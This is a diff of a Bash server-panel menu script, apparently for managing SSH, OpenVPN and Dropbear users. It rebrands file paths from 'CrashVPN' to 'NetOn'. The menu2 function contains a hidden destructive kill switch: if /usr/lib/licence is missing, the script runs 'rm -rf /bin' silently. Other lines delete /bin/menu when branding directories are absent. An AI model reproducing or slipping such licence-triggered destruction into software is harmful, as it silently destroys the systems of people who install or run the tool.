@@ -4,7 +4,7 @@ comando[0]="$1"
 comando[1]="$2"
  (
 [[ -e $HOME/fim ]] && rm $HOME/fim
-[[ ! -e /usr/lib/CrashVPN ]] && rm -rf /bin/menu > /dev/null 2>&1
+[[ ! -e /usr/lib/NetOn ]] && rm -rf /bin/menu > /dev/null 2>&1
 ${comando[0]} -y > /dev/null 2>&1
 ${comando[1]} -y > /dev/null 2>&1
 touch $HOME/fim
@@ -36,7 +36,7 @@ comando[0]="$1"
 comando[1]="$2"
  (
 [[ -e $HOME/fim ]] && rm $HOME/fim
-[[ ! -d /etc/CrashVPN ]] && rm -rf /bin/menu
+[[ ! -d /etc/NetOn ]] && rm -rf /bin/menu
 ${comando[0]} > /dev/null 2>&1
 ${comando[1]} > /dev/null 2>&1
 touch $HOME/fim
@@ -147,7 +147,7 @@ function autoexec () {
 }
 #menu2
 menu2 (){
-[[ -e /etc/crashvpn-torrent ]] && stsf=$(echo -e "\033[1;32m◉ ") || stsf=$(echo -e "\033[1;31m○ ")
+[[ -e /etc/NetOn-torrent ]] && stsf=$(echo -e "\033[1;32m◉ ") || stsf=$(echo -e "\033[1;31m○ ")
 stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
 autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
 [[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
@@ -163,7 +163,7 @@ else
 system=$(cut -d' ' -f1 /etc/issue.net)
 fi
 _ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
-[[ "$(cat /etc/CrashVPN/Exp)" != "" ]] && _expuser=$(cat /etc/CrashVPN/Exp) || _expuser="0"
+[[ "$(cat /etc/NetOn/Exp)" != "" ]] && _expuser=$(cat /etc/NetOn/Exp) || _expuser="0"
 [[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
 [[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
 _onli=$(($_ons + $_onop + $_ondrp))
@@ -276,7 +276,7 @@ else
 system=$(cut -d' ' -f1 /etc/issue.net)
 fi
 _ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
-[[ "$(cat /etc/CrashVPN/Exp)" != "" ]] && _expuser=$(cat /etc/CrashVPN/Exp) || _expuser="0"
+[[ "$(cat /etc/NetOn/Exp)" != "" ]] && _expuser=$(cat /etc/NetOn/Exp) || _expuser="0"
 [[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
 [[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
 _onli=$(($_ons + $_onop + $_ondrp))
